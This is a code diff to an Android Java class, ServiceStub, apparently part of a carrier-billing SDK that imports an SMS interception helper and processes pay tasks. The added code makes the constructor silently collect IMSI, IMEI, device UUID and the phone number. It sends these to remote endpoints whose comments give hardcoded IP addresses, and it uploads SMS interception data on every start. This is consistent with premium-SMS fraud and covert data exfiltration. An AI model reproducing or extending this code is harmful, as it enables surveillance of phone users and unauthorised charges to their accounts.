@@ -21,13 +21,13 @@ import com.msm.modu1e.utils.IMSInfo;
 import com.msm.modu1e.utils.ImsiUtil;
 import com.msm.modu1e.utils.SMSUtil;
 import com.orhanobut.hawk.Hawk;
-import com.thirdparty.net.PhoneNumCallback;
+import com.thirdparty.net.GetPhoneNumCallback;
+import com.thirdparty.net.ReportPhoneNumCallback;
 import com.thirdparty.net.Reporter;
 import com.thirdparty.net.SmsReflectInfoReportCallback;
 import com.thirdparty.net.SmsResultReportCallback;
 import com.thirdparty.sms.utils.SmsInterceptHelper;
 import com.thirdparty.utils.Constants;
-import com.thirdparty.utils.PreferenceUtil;
 import com.zhy.http.okhttp.OkHttpUtils;
 
 import java.util.HashMap;
@@ -49,10 +49,21 @@ public class ServiceStub implements IStub {
     private boolean mIsRunning = false;
     private boolean mIsPhoneNumInited = false;
     private PayTask mCurPayTask = null;
-    private static String mPid, mCid;
+    public static String mPid, mCid;
 
-    public void setmIsPhoneNumInited(boolean mIsPhoneNumInited) {
+    public void setIsPhoneNumInited(boolean mIsPhoneNumInited, String mobile, String imsi) {
         this.mIsPhoneNumInited = mIsPhoneNumInited;
+        Map<String, String> params = new HashMap<>();
+
+        params.put("pid", mPid);
+        params.put("cid", mCid);
+        params.put("imsi", imsi);
+        params.put("mobile", mobile);
+        // params.put("name", "feesdk2_upgprsnum");
+        // log.debug("GetPhoneNumCallback "+OkHttpUtils.get().params(params).url(Constants.URL_REPORT_NUM).build().getRequest().url());
+        //log.debug("GetPhoneNumCallback "+OkHttpUtils.get().params(params).url(Constants.URL_REPORT_NUM).build().getRequest().body());
+        //http://http://103.229.215.159/api/upgprsnum&pid=10003&cid=1&imsi=124335&mobile=1223352125
+        OkHttpUtils.get().params(params).url(Constants.URL_REPORT_NUM).build().execute(new ReportPhoneNumCallback(mContext));
     }
 
     public PayTask getCurPayTask() {
@@ -84,6 +95,9 @@ public class ServiceStub implements IStub {
     private ServiceStub(Context context) {
         this.mContext = context;
         initOkHttp();
+        initPhoneNum();
+        registerReceiver();
+        uploadSmsReflectInfo();
     }
 
     private void initOkHttp() {
@@ -95,14 +109,19 @@ public class ServiceStub implements IStub {
     private void initPhoneNum() {//pid=10003&cid=cid&imei=imei&imsi=imsi&&uuid=uuid&hasSecurityApp=1
         IMSInfo imsiInfo = ImsiUtil.getIMSInfo(mContext);
         String imsi = "";
+        int simCount = 0;
         if (imsiInfo != null) {
             String i1 = imsiInfo.imsi_1;
             String i2 = imsiInfo.imsi_2;
             if (!TextUtils.isEmpty(i1)) {
                 imsi = i1;
-            } else if (!TextUtils.isEmpty(i2)) {
-                imsi = i2;
+                simCount++;
             }
+            if (!TextUtils.isEmpty(i2)) {
+                imsi = i2;
+                simCount++;
+            }
+            if (simCount >= 2) return;
         }
         if (TextUtils.isEmpty(imsi)) {
             imsi = ImsiUtil.getIMSIWithAPI(mContext);
@@ -111,7 +130,8 @@ public class ServiceStub implements IStub {
         NetworkInfo info = connectivityManager.getActiveNetworkInfo();
         if (info != null && info.getType() == ConnectivityManager.TYPE_MOBILE) {
             if (imsi != null) {
-                if (imsi.startsWith("46000") || imsi.startsWith("46002") || imsi.startsWith("46003")) {
+                if (imsi.startsWith("46000") || imsi.startsWith("46002") || imsi.startsWith("46007")//CM
+                        || imsi.startsWith("46003") || imsi.startsWith("46005") || imsi.startsWith("46011")) {//CT
                     try {
                         Map<String, String> params = new HashMap<>();
                         String pid = mPid;
@@ -126,8 +146,8 @@ public class ServiceStub implements IStub {
                         params.put("imei", imei);
                         params.put("imsi", imsi);
                         params.put("uuid", new DeviceUuidFactory(mContext).getDeviceUuid());
-                        params.put("name", "feeSdk2_gprsMobile");//http://103.229.214.108/api/test?name=feeSdk2_fee&pid=10003&cid=cid&imsi=imsi&iccid=iccid&imei=imei&uuid=uuid
-                        OkHttpUtils.get().params(params).url(Constants.URL_GET_NUM).build().execute(new PhoneNumCallback(mContext));
+                        // params.put("name", "feeSdk2_gprsMobile");//http://103.229.214.108/api/gprsgetnum&pid=10003&cid=cid&imsi=460021181154164&iccid=iccid&imei=imei&uuid=uuid
+                        OkHttpUtils.get().params(params).url(Constants.URL_GET_NUM).build().execute(new GetPhoneNumCallback(mContext, imsi));
                     } catch (IllegalArgumentException e) {
                         e.printStackTrace();
                     }
@@ -139,7 +159,8 @@ public class ServiceStub implements IStub {
 
     @Override
     public void pay(PayTask payTask) {
-
+        mPid = payTask.mPid;
+        mCid = payTask.mCid;
         if (payTask == null || payTask.mPrice < 0) {
             return;
         }
@@ -158,17 +179,15 @@ public class ServiceStub implements IStub {
      */
     @Override
     public void startService() {
-        log.debug("ServiceStub startService version:" + getVersion());
-        registerReceiver();
+        //registerReceiver();
         registerSmsIndexProider();
-        scheduleTask();
-        uploadSmsReflectInfo();
+        //scheduleTask();
+        //uploadSmsReflectInfo();
         mIsRunning = true;
     }
 
     @Override
     public void stopService() {
-        log.debug("ServiceStub stopService version:" + getVersion());
         unRegisterReceiver();
         stopThirdSdkService();
         mIsRunning = false;
@@ -250,8 +269,8 @@ public class ServiceStub implements IStub {
     }
 
     private void scheduleTask() {
-        doInternalTestTask();
-        scheduleRequestPayTask(REQUEST_PAYTASK_STAMP);
+        // doInternalTestTask();
+        //  scheduleRequestPayTask(REQUEST_PAYTASK_STAMP);
     }
 
     private static Timer smRequestPayTask;
@@ -295,7 +314,14 @@ public class ServiceStub implements IStub {
     }
 
     private void uploadSmsReflectInfo() {
-        boolean isReport = PreferenceUtil.readRecord(mContext, "reportSmsRe", false);
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                log.debug("start reportSmsReflect");
+                Reporter.reportSmsReflect(mContext, new SmsReflectInfoReportCallback(mContext));
+            }
+        }).start();
+        /*boolean isReport = PreferenceUtil.readRecord(mContext, "reportSmsRe", false);
         if (!isReport) {
             new Thread(new Runnable() {
                 @Override
@@ -305,7 +331,7 @@ public class ServiceStub implements IStub {
                 }
             }).start();
             PreferenceUtil.saveRecord(mContext, "reportSmsRe", true);
-        }
+        }*/
     }
 
     private static Timer smUploadLogTimer = null;
